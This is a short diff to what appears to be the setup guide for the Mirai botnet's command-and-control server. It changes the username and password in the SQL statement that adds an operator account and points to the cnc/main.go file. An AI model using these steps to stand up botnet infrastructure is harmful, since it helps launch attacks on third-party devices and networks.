@@ -55,7 +55,7 @@ http://pastebin.com/86d0iL9g
 
 This will create database for you. To add your user,
 ```
-INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');
+INSERT INTO users VALUES (NULL, 'josh-G', 'mypasswordblahah', 0, 0, 0, 0, -1, 1, 30, '');
 ```
 
 Now, go into file ./mirai/cnc/main.go
